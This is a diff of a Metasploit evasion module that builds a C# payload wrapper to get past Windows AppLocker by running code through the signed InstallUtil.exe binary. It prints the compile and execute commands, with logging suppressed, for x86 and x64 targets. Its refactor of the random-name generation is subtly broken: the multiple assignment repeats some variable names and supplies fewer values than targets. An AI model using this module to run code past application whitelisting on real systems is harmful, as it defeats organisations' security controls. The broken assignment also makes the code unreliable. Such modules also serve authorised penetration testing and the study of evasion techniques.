@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Evasion
 
   def initialize(info={})
     super(merge_info(info,
-      'Name'        => 'applocker_evasion_install_util',
+      'Name'        => 'Applocker Evasion .NET Framework Installation Utility',
       'Description' => %q{
         This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies.
         This technique utilises the Microsoft signed binary InstallUtil.exe to execute user supplied code.
@@ -20,7 +20,8 @@ class MetasploitModule < Msf::Evasion
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
       'Arch'        => [ ARCH_X86, ARCH_X64 ],
-      'Targets'     => [ ['Microsoft Windows', {}] ]
+      'Targets'     => [ ['Microsoft Windows', {}] ],
+      'References'  => [ ['URL', 'https://attack.mitre.org/techniques/T1118/'] ]
     ))
 
     register_options([
@@ -35,43 +36,26 @@ class MetasploitModule < Msf::Evasion
 
 
   def instructions
-    <<~HEREDOC
+    if payload.arch.first == ARCH_X86
+      print_status "Copy #{datastore['FILENAME']} to the target"
+      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe"
+    else
+      print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\csc.exe /out:installutil.exe #{datastore['FILENAME']}"
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe"
+    end
+  end
 
-        ___________________________________________________________________________________________________________________________________________
-       |                                                                                                                                           |
-       |                                                                Instructions                                                               |
-       |___________________________________________________________________________________________________________________________________________|
-       |                                                                                                                                           |
-       | 1.Copy #{datastore['FILENAME']} to the target and execute:                                                                                        |
-       | 2.x86{                                                                                                                                    |
-       |       Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /out:installutil.exe #{datastore['FILENAME']}                          |
-       |       Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe       |
-       |      }                                                                                                                                    |
-       |  x64{                                                                                                                                     |
-       |      Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /out:installutil.exe #{datastore['FILENAME']}                         |
-       |      Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe      |
-       |      }                                                                                                                                    |
-       |___________________________________________________________________________________________________________________________________________|
-    HEREDOC
+
+  def mod(var)
+    var = Rex::Text.rand_text_alpha (3)
   end
 
 
   def install_util
     esc = build_payload
-    moda = Rex::Text.rand_text_alpha (3)
-    modb = Rex::Text.rand_text_alpha (3)
-    modc = Rex::Text.rand_text_alpha (3)
-    modd = Rex::Text.rand_text_alpha (3)
-    mode = Rex::Text.rand_text_alpha (3)
-    modf = Rex::Text.rand_text_alpha (3)
-    modg = Rex::Text.rand_text_alpha (3)
-    modh = Rex::Text.rand_text_alpha (3)
-    modi = Rex::Text.rand_text_alpha (3)
-    modj = Rex::Text.rand_text_alpha (3)
+    moda, modb, modc, modd, mode, modf, modg, mode, modf, modg, modh, modi, modj = mod(moda), mod(modb), mod(modc), mod(modd), mod(mode), mod(modf), mod(modg), mod(modh), mod(modi), mod(modj)
     <<~HEREDOC
-       /*
-       #{instructions}
-      */
        using System;
        namespace #{Rex::Text.rand_text_alpha 3}
        {
@@ -114,7 +98,7 @@ class MetasploitModule < Msf::Evasion
 
   def run
     file_create(install_util)
-    print_status("#{instructions}")
+    instructions
   end
 
 end
